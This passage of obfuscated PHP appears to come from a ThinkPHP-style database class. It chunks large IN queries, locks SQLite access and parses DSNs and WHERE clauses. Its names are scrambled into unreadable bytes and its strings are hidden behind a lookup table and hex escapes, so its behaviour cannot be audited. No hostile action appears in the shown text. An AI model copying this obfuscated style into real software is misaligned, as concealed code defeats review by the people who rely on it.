(empty($¶ºÚÀĞ)) { $this->error = think_lang($ÂÚŸ™µ¦[326]); return !1; } $Ôõ÷çë = $this->_parseOptions($Ôõ÷çë); foreach ($¶ºÚÀĞ as $¯äÄÛğ => $¼ª¾Ì£Û) { $¶ºÚÀĞ[$¯äÄÛğ] = $this->_facade($¼ª¾Ì£Û); $this->_beforeInsert($¶ºÚÀĞ[$¯äÄÛğ], $Ôõ÷çë); } if (method_exists($this->db, $ÂÚŸ™µ¦[327])) { for ($Úˆµ¬äÖ = 0; $Úˆµ¬äÖ < count($¶ºÚÀĞ); $Úˆµ¬äÖ += $â’ïóîú) { $çäÛÆÄÆ = array_slice($¶ºÚÀĞ, $Úˆµ¬äÖ, $â’ïóîú); if (!is_array($çäÛÆÄÆ) || count($çäÛÆÄÆ) == 0) { break; } $ı‚‡É– = $this->db->insertAll($çäÛÆÄÆ, $Ôõ÷çë, $÷—€ç”Ñ); $this->chunkEventCheck(count($çäÛÆÄÆ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¶ºÚÀĞ as $¯äÄÛğ => $¼ª¾Ì£Û) { $ı‚‡É– = $this->db->insert($¼ª¾Ì£Û, $Ôõ÷çë, $÷—€ç”Ñ); } $this->commit(); } if (!1 !== $ı‚‡É–) { $š·—Ä©Ş = $this->getLastInsID(); if ($š·—Ä©Ş) { return $š·—Ä©Ş; } } return $ı‚‡É–; } public function save($œºøÙÑ = '', $ÀÉ¹Ä÷  = array()) { $Û©Ïà =& $_SERVER[ •ŒÓîÆ]; $Âƒè¤Š = self::SQL_WHERE_IN_CHUNK; $Ä³ƒÂäú = $this->optionsValue(); $Ï±Ÿ†¿œ = $this->findWhereField($Ä³ƒÂäú); if (!$Ï±Ÿ†¿œ) { return parent::save($œºøÙÑ, $ÀÉ¹Ä÷ ); } $÷µ‚• = 0; $Æ¯Ü°  = $Ä³ƒÂäú[$Û©Ïà[330]][$Ï±Ÿ†¿œ][1]; $Æ¯Ü°  = is_array($Æ¯Ü° ) ? $Æ¯Ü°  : array(); $¨Í—ªÑû = count($Æ¯Ü° ); for ($ÔâóÅÂ = 0; $ÔâóÅÂ < $¨Í—ªÑû; $ÔâóÅÂ += $Âƒè¤Š) { $¡Üè«¬è = array_slice($Æ¯Ü° , $ÔâóÅÂ, $Âƒè¤Š); if (!is_array($¡Üè«¬è) || count($¡Üè«¬è) == 0) { break; } $Ä³ƒÂäú[$Û©Ïà[330]][$Ï±Ÿ†¿œ][1] = $¡Üè«¬è; $this->optionsValue($Ä³ƒÂäú); $÷µ‚• += parent::save($œºøÙÑ, $ÀÉ¹Ä÷ ); $this->chunkEventCheck(count($¡Üè«¬è)); } $this->chunkEventSet(); return $÷µ‚•; } public function add($Ö®•¾Ø = '', $êŞ‚¡¶³ = array(), $Çìšùò = false) { if ($this->addTaskStatus && is_array($Ö®•¾Ø)) { $this->addTaskData[] = $Ö®•¾Ø; return; } return parent::add($Ö®•¾Ø, $êŞ‚¡¶³, $Çìšùò); } public function parseWhereLike($«¤ò÷» , $ËÒ…©ª¿ = '', $ëÉö¤Ù± = false, &$•·îÍ³Æ = false) { $²ÇÖÂ†Æ =& $_SERVER[ •ŒÓîÆ]; $ñÅË°òº = $GLOBALS[$²ÇÖÂ†Æ[6]][$²ÇÖÂ†Æ[435]]; if (!$ñÅË°òº[$²ÇÖÂ†Æ[436]]) { return $«¤ò÷» ; } if (!is_array($«¤ò÷» )) { return $«¤ò÷» ; } $…³Ä‚óÒ = array(); $°À•ĞèÛ = 0; foreach ($«¤ò÷»  as $¤Ùê‰¥ô => $À“éÍØ) { if (is_array($À“éÍØ) && count($À“éÍØ) == 2 && $À“éÍØ[0] == $²ÇÖÂ†Æ[437] && is_string($À“éÍØ[1]) && substr($À“éÍØ[1], 0, 1) == $²ÇÖÂ†Æ[438] && substr($À“éÍØ[1], strlen($À“éÍØ[1]) - 1, 1) == $²ÇÖÂ†Æ[438]) { $•·îÍ³Æ = !0; $÷²­ò± = is_string($¤Ùê‰¥ô) ? $¤Ùê‰¥ô : $ËÒ…©ª¿; $«ûÅåÁ = substr($À“éÍØ[1], 1, strlen($À“éÍØ[1]) - 2); $«ûÅåÁ = $this->db->escapeString($«ûÅåÁ); if (!strpos($÷²­ò±, $²ÇÖÂ†Æ[10])) { $÷²­ò± = $²ÇÖÂ†Æ[439] . $÷²­ò± . $²ÇÖÂ†Æ[439]; } $­šÖÖ¬ = $²ÇÖÂ†Æ[205] . $«ûÅåÁ . $²ÇÖÂ†Æ[205]; $«ûÅåÁ = str_replace(array($²ÇÖÂ†Æ[10], $²ÇÖÂ†Æ[440], $²ÇÖÂ†Æ[11]), $²ÇÖÂ†Æ[441], $«ûÅåÁ); if ($ñÅË°òº[$²ÇÖÂ†Æ[442]]) { $­šÖÖ¬ = $²ÇÖÂ†Æ[443] . $«ûÅåÁ . $²ÇÖÂ†Æ[444]; if ($ñÅË°òº[$²ÇÖÂ†Æ[445]]) { $­šÖÖ¬ = $²ÇÖÂ†Æ[444] . $«ûÅåÁ . $²ÇÖÂ†Æ[443]; } } $…³Ä‚óÒ[$°À•ĞèÛ] = $²ÇÖÂ†Æ[446] . $÷²­ò± . $²ÇÖÂ†Æ[447] . $­šÖÖ¬ . $²ÇÖÂ†Æ[448]; $°À•ĞèÛ++; continue; } if (is_array($À“éÍØ)) { $ËÒ…©ª¿ = is_string($¤Ùê‰¥ô) ? $¤Ùê‰¥ô : $ËÒ…©ª¿; $À“éÍØ = $this->parseWhereLike($À“éÍØ, $ËÒ…©ª¿, !0, $•·îÍ³Æ); } if (is_numeric($¤Ùê‰¥ô)) { $…³Ä‚óÒ[$°À•ĞèÛ] = $À“éÍØ; $°À•ĞèÛ++; } else { $…³Ä‚óÒ[$¤Ùê‰¥ô] = $À“éÍØ; } } if ($•·îÍ³Æ && !$ëÉö¤Ù±) { } return $…³Ä‚óÒ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ˆ­€ÇÒ = array()) { $°êâğ‡Š =& $_SERVER[ •ŒÓîÆ]; $üùçèÁŞ = self::SQL_WHERE_IN_CHUNK; $‘¹•ê¥ = $this->optionsValue(); $£öÚµ¡„ = $this->findWhereField($‘¹•ê¥); if (!$£öÚµ¡„ || isset($‘¹•ê¥[$°êâğ‡Š[347]]) || isset($‘¹•ê¥[$°êâğ‡Š[408]])) { return parent::select($ˆ­€ÇÒ); } $…¢ûûÄª = $‘¹•ê¥[$°êâğ‡Š[330]][$£öÚµ¡„][1]; $…¢ûûÄª = is_array($…¢ûûÄª) ? $…¢ûûÄª : array(); $î²¦“è¤ = null; for ($‡šÁÄ»Ğ = 0; $‡šÁÄ»Ğ < count($…¢ûûÄª); $‡šÁÄ»Ğ += $üùçèÁŞ) { $çò¡ØµÕ = array_slice($…¢ûûÄª, $‡šÁÄ»Ğ, $üùçèÁŞ); if (!is_array($çò¡ØµÕ) || count($çò¡ØµÕ) == 0) { break; } $‘¹•ê¥[$°êâğ‡Š[330]][$£öÚµ¡„][1] = $çò¡ØµÕ; $this->optionsValue($‘¹•ê¥); $ÁŒœÅêŸ = parent::select($ˆ­€ÇÒ); if (!$ÁŒœÅêŸ) { continue; } $î²¦“è¤ = is_array($î²¦“è¤) ? $î²¦“è¤ : array(); $î²¦“è¤ = array_merge($î²¦“è¤, $ÁŒœÅêŸ); } return $î²¦“è¤; } public function delete($ÌÃ“³İ = array()) { $°Šéò‰¨ =& $_SERVER[ •ŒÓîÆ]; $éì„“™õ = self::SQL_WHERE_IN_CHUNK; $±ı¹á‰¢ = $this->optionsValue(); $Õ•ËŠá = $this->findWhereField($±ı¹á‰¢); if (!$Õ•ËŠá) { return parent::delete($ÌÃ“³İ); } $ü£É¬ìç = 0; $áÈØ­¬î = $±ı¹á‰¢[$°Šéò‰¨[330]][$Õ•ËŠá][1]; $áÈØ­¬î = is_array($áÈØ­¬î) ? $áÈØ­¬î : array(); for ($ƒĞ¡úÕ = 0; $ƒĞ¡úÕ < count($áÈØ­¬î); $ƒĞ¡úÕ += $éì„“™õ) { $ÙË‰½é“ = array_slice($áÈØ­¬î, $ƒĞ¡úÕ, $éì„“™õ); if (!is_array($ÙË‰½é“) || count($ÙË‰½é“) == 0) { break; } $±ı¹á‰¢[$°Šéò‰¨[330]][$Õ•ËŠá][1] = $ÙË‰½é“; $this->optionsValue($±ı¹á‰¢); $ü£É¬ìç += parent::delete($ÌÃ“³İ); } return $ü£É¬ìç; } private function findWhereField($İ—×İ×) { $Øìä£¨… =& $_SERVER[ •ŒÓîÆ]; $¡şà = self::SQL_WHERE_IN_CHUNK; if (!is_array($İ—×İ×) || !is_array($İ—×İ×[$Øìä£¨…[330]])) { return !1; } foreach ($İ—×İ×[$Øìä£¨…[330]] as $¡Î¨î›” => $º†„©ÕÅ) { if (is_array($º†„©ÕÅ) && isset($º†„©ÕÅ[0]) && is_string($º†„©ÕÅ[0]) && strtolower($º†„©ÕÅ[0]) == $Øìä£¨…[7] && is_array($º†„©ÕÅ[1]) && count($º†„©ÕÅ[1]) > $¡şà) { ignore_timeout(); return $¡Î¨î›”; } } return !1; } public function setMasterDB($Šœ’ÎÁÓ = true) { think_config($_SERVER[ •ŒÓîÆ][449], $Šœ’ÎÁÓ); } } goto DÇµÊŞ¥¯º; e™ğŠ¾ÇË²: class DbSqlite3 extends DbSqlite3Base { public function query($ÉºŸèµË) { $Ÿóˆ£”© =& $_SERVER[ •ŒÓîÆ]; if (!CacheLock::fileLock($Ÿóˆ£”©[13])) { return !1; } $íëºæç¼ = parent::query($ÉºŸèµË); CacheLock::fileUnLock($Ÿóˆ£”©[13]); return $íëºæç¼; } public function execute($£ÜùèŒÖ) { $ª™“¾–Ä =& $_SERVER[ •ŒÓîÆ]; if (!CacheLock::fileLock($ª™“¾–Ä[13])) { return !1; } $Ö–ƒÄÏ§ = parent::execute($£ÜùèŒÖ); CacheLock::fileUnLock($ª™“¾–Ä[13]); return $Ö–ƒÄÏ§; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\151\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\156\x65\161" => "\x3c\76", "\x67\x74" => "\x3e", "\x65\147\x74" => "\76\x3d", "\154\164" => "\74", "\145\154\x74" => "\x3c\x3d", "\156\x6f\164\154\151\153\x65" => "\116\x4f\x54\40\114\111\x4b\x45", "\x6c\151\153\x65" => "\114\x49\x4b\105", "\151\156" => "\x49\116", "\156\x6f\x74\x69\x6e" => "\x4e\117\x54\x20\x49\x4e", "\156\157\x74\x20\x69\156" => "\116\x4f\124\40\x49\116", "\142\x65\x74\x77\x65\145\x6e" => "\102\105\x54\127\x45\105\x4e", "\x6e\157\164\142\x65\164\167\145\x65\156" => "\x4e\117\x54\40\x42\x45\124\127\105\x45\116", "\156\x6f\164\40\x62\145\164\x77\x65\x65\x6e" => "\x4e\x4f\x54\x20\102\105\124\127\105\105\x4e"); protected $selectSql = "\123\105\x4c\105\103\x54\x25\104\x49\x53\x54\x49\x4e\x43\x54\x25\40\x25\x46\111\105\114\x44\45\40\x46\x52\117\x4d\40\45\x54\x41\x42\114\x45\x25\x25\112\117\111\116\45\45\127\110\105\x52\105\45\x25\x47\x52\x4f\x55\120\x25\45\x48\x41\x56\x49\116\x47\x25\45\x4f\122\104\105\x52\45\45\114\111\115\x49\x54\45\x20\x25\x55\x4e\x49\117\x4e\x25\45\x43\x4f\115\115\105\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $‡­ç§­ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ •ŒÓîÆ][1001], $‡­ç§­); } public function factory($ãàœØƒ» = '') { $³•œğ¤Œ =& $_SERVER[ •ŒÓîÆ]; $ãàœØƒ» = $this->parseConfig($ãàœØƒ»); if (empty($ãàœØƒ»[$³•œğ¤Œ[1002]])) { think_exception(think_lang($³•œğ¤Œ[1003])); } $this->dbType = ucwords(strtolower($ãàœØƒ»[$³•œğ¤Œ[1002]])); $†ï•áâç = $³•œğ¤Œ[1004] . $this->dbType; if (class_exists($†ï•áâç)) { $ïƒğğ´ï = new $†ï•áâç($ãàœØƒ»); if ($³•œğ¤Œ[1005] != strtolower($ãàœØƒ»[$³•œğ¤Œ[1002]])) { $ïƒğğ´ï->dbType = strtoupper($this->dbType); } else { $ïƒğğ´ï->dbType = $this->_getDsnType($ãàœØƒ»[$³•œğ¤Œ[957]]); } } else { think_exception(think_lang($³•œğ¤Œ[1006]) . $³•œğ¤Œ[1007] . $†ï•áâç); } return $ïƒğğ´ï; } public function __call($Íâå·‡Î, $¥Íò­›Á) { if (method_exists($this, $Íâå·‡Î)) { return call_user_func_array(array($this, $Íâå·‡Î), $¥Íò­›Á); } } protected function _getDsnType($ÊÃÂèÆú) { $Ç¾ü†ô• = explode($_SERVER[ •ŒÓîÆ][4], $ÊÃÂèÆú); $¹ÖÏæªÈ = strtoupper(trim($Ç¾ü†ô•[0])); return $¹ÖÏæªÈ; } private function parseConfig($¤ÖƒÚñ = '') { $º×¬¬Ï =& $_SERVER[ •ŒÓîÆ]; if (!empty($¤ÖƒÚñ) && is_string($¤ÖƒÚñ)) { $¤ÖƒÚñ = $this->parseDSN($¤ÖƒÚñ); } elseif (is_array($¤ÖƒÚñ)) { $¤ÖƒÚñ = array_change_key_case($¤ÖƒÚñ); $¤ÖƒÚñ = array($º×¬¬Ï[1002] => $¤ÖƒÚñ[$º×¬¬Ï[1008]], $º×¬¬Ï[929] => $¤ÖƒÚñ[$º×¬¬Ï[1009]], $º×¬¬Ï[930] => $¤ÖƒÚñ[$º×¬¬Ï[1010]], $º×¬¬Ï[927] => $¤ÖƒÚñ[$º×¬¬Ï[1011]], $º×¬¬Ï[928] => $¤ÖƒÚñ[$º×¬¬Ï[1012]], $º×¬¬Ï[21] => $¤ÖƒÚñ[$º×¬¬Ï[1013]], $º×¬¬Ï[957] => $¤ÖƒÚñ[$º×¬¬Ï[1014]], $º×¬¬Ï[17] => isset($¤ÖƒÚñ[$º×¬¬Ï[1015]]) ? $¤ÖƒÚñ[$º×¬¬Ï[1015]] : array()); } elseif (empty($¤ÖƒÚñ)) { if (think_config($º×¬¬Ï[1016]) && $º×¬¬Ï[1005] != strtolower(think_config($º×¬¬Ï[1017]))) { $¤ÖƒÚñ = $this->parseDSN(think_config($º×¬¬Ï[1016])); } else { $¤ÖƒÚñ = array($º×¬¬Ï[1002] => think_config($º×¬¬Ï[1017]), $º×¬¬Ï[929] => think_config($º×¬¬Ï[1018]), $º×¬¬Ï[930] => think_config($º×¬¬Ï[1019]), $º×¬¬Ï[927] => think_config($º×¬¬Ï[1020]), $º×¬¬Ï[928] => think_config($º×¬¬Ï[1021]), $º×¬¬Ï[21] => think_config($º×¬¬Ï[301]), $º×¬¬Ï[957] => think_config($º×¬¬Ï[1016]), $º×¬¬Ï[17] => think_config($º×¬¬Ï[1022])); } } return $¤ÖƒÚñ; } protected function initConnect($ÜìÒ›ÔÂ = true) { if (1 == think_config($_SERVER[ •ŒÓîÆ][22])) { $this->_linkID = $this->multiConnect($ÜìÒ›ÔÂ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $à¸şå¡ => $øï±ı«) { $this->_linkID = $øï±ı«; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Êäû´ÛÊ = false) { $”ÁÚÅË =& $_SERVER[ •ŒÓîÆ]; static $õ°ÃÁÀå = array(); static $÷Âµœ = -1; if (empty($õ°ÃÁÀå)) { foreach ($this->config as $‚ª¬¦Èª => $ÃÑá®²) { $õ°ÃÁÀå[$‚ª¬¦Èª] = explode($”ÁÚÅË[50], $ÃÑá®²); } } if (think_config($”ÁÚÅË[1023])) { if ($Êäû´ÛÊ || think_config($”ÁÚÅË[449]) === !0) { $ÀÔ¹Ï¬É = floor(mt_rand(0, think_config($”ÁÚÅË[1024]) - 1)); $÷Âµœ = $ÀÔ¹Ï¬É; } else { if (is_numeric(think_config($”ÁÚÅË[1025]))) { $ÀÔ¹Ï¬É = think_config($”ÁÚÅË[1025]); } else { $ÀÔ¹Ï¬É = floor(mt_rand(think_config($”ÁÚÅË[1024]), count($õ°ÃÁÀå[$”ÁÚÅË[927]]) - 1)); } } } else { $ÀÔ¹Ï¬É = floor(mt_rand(0, count($õ°ÃÁÀå[$”ÁÚÅË[927]]) - 1)); $÷Âµœ = $ÀÔ¹Ï¬É; } $ÀÔ¹Ï¬É = $÷Âµœ !== -1 ? $÷Âµœ : $ÀÔ¹Ï¬É; $ÓÜÂ°ĞÙ = array($”ÁÚÅË[929] => isset($õ°ÃÁÀå[$”ÁÚÅË[929]][$ÀÔ¹Ï¬É]) ? $õ°ÃÁÀå[$”ÁÚÅË[929]][$ÀÔ¹Ï¬É] : $õ°ÃÁÀå[$”ÁÚÅË[929]][0], $”ÁÚÅË[930] => isset($õ°ÃÁÀå[$”ÁÚÅË[930]][$ÀÔ¹Ï¬É]) ? $õ°ÃÁÀå[$”ÁÚÅË[930]][$ÀÔ¹Ï¬É] : $õ°ÃÁÀå[$”ÁÚÅË[930]][0], $”ÁÚÅË[927] => isset($õ°ÃÁÀå[$”ÁÚÅË[927]][$ÀÔ¹Ï¬É]) ? $õ°ÃÁÀå[$”ÁÚÅË[927]][$ÀÔ¹Ï¬É] : $õ°ÃÁÀå[$”ÁÚÅË[927]][0], $”ÁÚÅË[928] => isset($õ°ÃÁÀå[$”ÁÚÅË[928]][$ÀÔ¹Ï¬É]) ? $õ°ÃÁÀå[$”ÁÚÅË[928]][$ÀÔ¹Ï¬É] : $õ°ÃÁÀå[$”ÁÚÅË[928]][0], $”ÁÚÅË[21] => isset($õ°ÃÁÀå[$”ÁÚÅË[21]][$ÀÔ¹Ï¬É]) ? $õ°ÃÁÀå[$”ÁÚÅË[21]][$ÀÔ¹Ï¬É] : $õ°ÃÁÀå[$”ÁÚÅË[21]][0], $”ÁÚÅË[957] => isset($õ°ÃÁÀå[$”ÁÚÅË[957]][$ÀÔ¹Ï¬É]) ? $õ°ÃÁÀå[$”ÁÚÅË[957]][$ÀÔ¹Ï¬É] : $õ°ÃÁÀå[$”ÁÚÅË[957]][0], $”ÁÚÅË[17] => isset($õ°ÃÁÀå[$”ÁÚÅË[17]][$ÀÔ¹Ï¬É]) ? $õ°ÃÁÀå[$”ÁÚÅË[17]][$ÀÔ¹Ï¬É] : $õ°ÃÁÀå[$”ÁÚÅË[17]][0]); return $this->connect($ÓÜÂ°ĞÙ, $ÀÔ¹Ï¬É); } public function parseDSN($Í¡İœĞÆ) { $ìÊ•€‚Ã =& $_SERVER[ •ŒÓîÆ]; if (empty($Í¡İœĞÆ)) { return !1; } $ÉŒ¹¦¯ = parse_url($Í¡İœĞÆ); if ($ÉŒ¹¦¯[$ìÊ•€‚Ã[197]]) { $ğ®Ğ÷­Ò = array($ìÊ•€‚Ã[1002] => $ÉŒ¹¦¯[$ìÊ•€‚Ã[197]], $ìÊ•€‚Ã[929] => isset($ÉŒ¹¦¯[$ìÊ•€‚Ã[642]]) ? $ÉŒ¹¦¯[$ìÊ•€‚Ã[642]] : $ìÊ•€‚Ã[12], $ìÊ•€‚Ã[930] => isset($ÉŒ¹¦¯[$ìÊ•€‚Ã[1026]]) ? $ÉŒ¹¦¯[$ìÊ•€‚Ã[1026]] : $ìÊ•€‚Ã[12], $ìÊ•€‚Ã[927] => isset($ÉŒ¹¦¯[$ìÊ•€‚Ã[198]]) ? $ÉŒ¹¦¯[$ìÊ•€‚Ã[198]] : $ìÊ•€‚Ã[12], $ìÊ•€‚Ã[928] => isset($ÉŒ¹¦¯[$ìÊ•€‚Ã[199]]) ? $ÉŒ¹¦¯[$ìÊ•€‚Ã[199]] : $ìÊ•€‚Ã[12], $ìÊ•€‚Ã[21] => isset($ÉŒ¹¦¯[$ìÊ•€‚Ã[86]]) ? substr($ÉŒ¹¦¯[$ìÊ•€‚Ã[86]], 1) : $ìÊ•€‚Ã[12]); } else { preg_match($ìÊ•€‚Ã[1027], trim($Í¡İœĞÆ), $àıÊÆ‹à); $ğ®Ğ÷­Ò = array($ìÊ•€‚Ã[1002] => $àıÊÆ‹à[1], $ìÊ•€‚Ã[929] => $àıÊÆ‹à[2], $ìÊ•€‚Ã[930] => $àıÊÆ‹à[3], $ìÊ•€‚Ã[927] => $àıÊÆ‹à[4], $ìÊ•€‚Ã[928] => $àıÊÆ‹à[5], $ìÊ•€‚Ã[21] => $àıÊÆ‹à[6]); } $ğ®Ğ÷­Ò[$ìÊ•€‚Ã[957]] = $ìÊ•€‚Ã[12]; return $ğ®Ğ÷­Ò; } protected function debug() { $³ÚâÛÂ =& $_SERVER[ •ŒÓîÆ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $³ÚâÛÂ[1028]; if (think_config($³ÚâÛÂ[1029])) { think_status($³ÚâÛÂ[1030]); think_trace($this->queryStr . $³ÚâÛÂ[1031] . think_status($³ÚâÛÂ[24], $³ÚâÛÂ[1030], 6) . $³ÚâÛÂ[1032], $³ÚâÛÂ[12], $³ÚâÛÂ[1033]); } } protected function parseLock($È§©Èæ˜ = false) { $’ƒ—¶—Æ =& $_SERVER[ •ŒÓîÆ]; if (!$È§©Èæ˜) { return $’ƒ—¶—Æ[12]; } if ($’ƒ—¶—Æ[959] == $this->dbType) { return $’ƒ—¶—Æ[1034]; } return $’ƒ—¶—Æ[1035]; } protected function parseSet($Íü¼–·) { $ØŠñã–„ =& $_SERVER[ •ŒÓîÆ]; foreach ($Íü¼–· as $÷Øé·…ô => $Şû¡à´²) { if (is_array($Şû¡à´²) && $ØŠñã–„[352] == $Şû¡à´²[0]) { $Ö¬ßÉ¸Ë[] = $this->parseKey($÷Øé·…ô) . $ØŠñã–„[925] . $Şû¡à´²[1]; } elseif (is_scalar($Şû¡à´²) || is_null($Şû¡à´²)) { $Ö¬ßÉ¸Ë[] = $this->parseKey($÷Øé·…ô) . $ØŠñã–„[925] . $this->parseValue($Şû¡à´²); } } return $ØŠñã–„[1036] . implode($ØŠñã–„[50], $Ö¬ßÉ¸Ë); } protected function bindParam($ÍÏ•¡ÓÙ, $…•àŞÇî) { $this->bind[$_SERVER[ •ŒÓîÆ][4] . $ÍÏ•¡ÓÙ] = $…•àŞÇî; } protected function parseBind($´•è·ùŒ) { $´•è·ùŒ = array_merge($this->bind, $´•è·ùŒ); $this->bind = array(); return $´•è·ùŒ; } function parseKey(&$ÇˆğÙĞ, $İôóŸƒµ = true) { if ($İôóŸƒµ) { $ÇˆğÙĞ = $this->parseKeyCheck($ÇˆğÙĞ); } return $ÇˆğÙĞ; } function parseKeyCheck($©Ò•¢µ) { $ğÏã±üî =& $_SERVER[ •ŒÓîÆ]; $©Ò•¢µ = trim($©Ò•¢µ); if (!preg_match($ğÏã±üî[1037], $©Ò•¢µ)) { think_exception($ğÏã±üî[1038] . $©Ò•¢µ); } return $©Ò•¢µ; } protected function parseValue($Êó¢òÇ) { $Ş‚Á¸É =& $_SERVER[ •ŒÓîÆ]; if (is_string($Êó¢òÇ)) { $Êó¢òÇ = $Ş‚Á¸É[998] . $this->escapeString($Êó¢òÇ) . $Ş‚Á¸É[998]; } elseif (isset($Êó¢òÇ[0]) && is_string($Êó¢òÇ[0]) && strtolower($Êó¢òÇ[0]) == $Ş‚Á¸É[352]) { $Êó¢òÇ = $this->escapeString($Êó¢òÇ[1]); } elseif (is_array($Êó¢òÇ)) { $Êó¢òÇ = array_map(array($this, $Ş‚Á¸É[999]), $Êó¢òÇ); } elseif (is_bool($Êó¢òÇ)) { $Êó¢òÇ = $Êó¢òÇ ? $Ş‚Á¸É[90] : $Ş‚Á¸É[214]; } elseif (is_null($Êó¢òÇ)) { $Êó¢òÇ = $Ş‚Á¸É[105]; } return $Êó¢òÇ; } protected function parseField($¼‘£î) { $ı®¨†— =& $_SERVER[ •ŒÓîÆ]; if (is_string($¼‘£î) && strpos($¼‘£î, $ı®¨†—[50])) { $¼‘£î = explode($ı®¨†—[50], $¼‘£î); } if (is_array($¼‘£î)) { $Ğúãöø· = array(); foreach ($¼‘£î as $Ø•ÙÆ¦˜ => $¨‡ñĞšƒ) { if (!is_numeric($Ø•ÙÆ¦˜)) { $Ğúãöø·[] = $this->parseKey($Ø•ÙÆ¦˜, !1) . $ı®¨†—[1039] . $this->parseKey($¨‡ñĞšƒ); } else { $Ğúãöø·[] = $this->parseKey($¨‡ñĞšƒ); } } $Ş÷û•Ê– = implode($ı®¨†—[50], $Ğúãöø·); } elseif (is_string($¼‘£î) && !empty($¼‘£î)) { $Ş÷û•Ê– = $¼‘£î; } else { $Ş÷û•Ê– = $ı®¨†—[205]; } return $Ş÷û•Ê–; } protected function parseTable($Óç›æ‹İ) { $éõÍ†Ú =& $_SERVER[ •ŒÓîÆ]; if (is_array($Óç›æ‹İ)) { $ÄÕÆ—Š½ = array(); foreach ($Óç›æ‹İ as $Â®úµ— => $›¾İî½) { if (!is_numeric($Â®úµ—)) { $ÄÕÆ—Š½[] = $this->parseKey($Â®úµ—) . $éõÍ†Ú[53] . $this->parseKey($›¾İî½); } else { $ÄÕÆ—Š½[] = $this->parseKey($Â®úµ—); } } $Óç›æ‹İ = $ÄÕÆ—Š½; } elseif (is_string($Óç›æ‹İ)) { if (strstr($Óç›æ‹İ, $éõÍ†Ú[53])) { return $Óç›æ‹İ; } $Óç›æ‹İ = explode($éõÍ†Ú[50], $Óç›æ‹İ); array_walk($Óç›æ‹İ, array($this, $éõÍ†Ú[947])); } return $éõÍ†Ú[941] . trim(implode($éõÍ†Ú[1040], $Óç›æ‹İ), $éõÍ†Ú[439]) . $éõÍ†Ú[941]; } protected function parseWhere($‡˜ûîñÌ) { $ê°Ÿ÷õ =& $_SERVER[ •ŒÓîÆ]; $”±» «» = $ê°Ÿ÷õ[12]; if (is_string($‡˜ûîñÌ)) { $”±» «» = $‡˜ûîñÌ; } else { $õìè¢Ÿ‹ = isset($‡˜ûîñÌ[$ê°Ÿ÷õ[1041]]) ? strtoupper($‡˜ûîñÌ[$ê°Ÿ÷õ[1041]]) : $ê°Ÿ÷õ[12]; if (in_array($õìè¢Ÿ‹, array($ê°Ÿ÷õ[1042], $ê°Ÿ÷õ[1043], $ê°Ÿ÷õ[1044]))) { $õìè¢Ÿ‹ = $ê°Ÿ÷õ[53] . $õìè¢Ÿ‹ . $ê°Ÿ÷õ[53]; unset($‡˜ûîñÌ[$ê°Ÿ÷õ[1041]]); } else { $õìè¢Ÿ‹ = $ê°Ÿ÷õ[1045]; } foreach ($‡˜ûîñÌ as $Ş«ÈÑ¹Ê => $‘ÊÙˆÆø) { $”±» «» .= $ê°Ÿ÷õ[332]; if (is_numeric($Ş«ÈÑ¹Ê)) { $Ş«ÈÑ¹Ê = $ê°Ÿ÷õ[1046]; } if (0 === strpos($Ş«ÈÑ¹Ê, $ê°Ÿ÷õ[11])) { $”±» «» .= $this->parseThinkWhere($Ş«ÈÑ¹Ê, $‘ÊÙˆÆø); } else { if (!preg_match($ê°Ÿ÷õ[1047], trim($Ş«ÈÑ¹Ê))) { think_exception(think_lang($ê°Ÿ÷õ[1048]) . $ê°Ÿ÷õ[4] . $Ş«ÈÑ¹Ê); } $´Ñ‹”òè = is_array($‘ÊÙˆÆø) && isset($‘ÊÙˆÆø[$ê°Ÿ÷õ[1049]]); $Ş«ÈÑ¹Ê = trim($Ş«ÈÑ¹Ê); if (strpos($Ş«ÈÑ¹Ê, $ê°Ÿ÷õ[338])) { $Õ®®Ã– = explode($ê°Ÿ÷õ[338], $Ş«ÈÑ¹Ê); $ŒÀ·í±ã = array(); foreach ($Õ®®Ã– as $Ğ½¥üªÏ => $Ëş¥¾Ğç) { $×µ’š¡Õ = $´Ñ‹”òè ? $‘ÊÙˆÆø[$Ğ½¥üªÏ] : $‘ÊÙˆÆø; $ŒÀ·í±ã[] = $ê°Ÿ÷õ[315] . $this->parseWhereItem($this->parseKey($Ëş¥¾Ğç), $×µ’š¡Õ) . $ê°Ÿ÷õ[946]; } $”±» «» .= implode($ê°Ÿ÷õ[1050], $ŒÀ·í±ã); } elseif (strpos($Ş«ÈÑ¹Ê, $ê°Ÿ÷õ[339])) { $Õ®®Ã– = explode($ê°Ÿ÷õ[339], $Ş«ÈÑ¹Ê); $ŒÀ·í±ã = array(); foreach ($Õ®®Ã– as $Ğ½¥üªÏ => $Ëş¥¾Ğç) { $×µ’š¡Õ = $´Ñ‹”òè ? $‘ÊÙˆÆø[$Ğ½¥üªÏ] : $‘ÊÙˆÆø; $ŒÀ·í±ã[] = $ê°Ÿ÷õ[315] . $this->parseWhereItem($this->parseKey($Ëş¥¾Ğç), $×µ’š¡Õ) . $ê°Ÿ÷õ[946]; } $”±» «» .= implode($ê°Ÿ÷õ[1045], $ŒÀ·í±ã); } else { $”±» «» .= $this->parseWhereItem($this->parseKey($Ş«ÈÑ¹Ê), $‘ÊÙˆÆø); } } $”±» «» .= $ê°Ÿ÷õ[333] . $õìè¢Ÿ‹; } $”±» «» = substr($”±» «», 0, -strlen($õìè¢Ÿ‹)); } return empty($”±» «») ? $ê°Ÿ÷õ[12] : 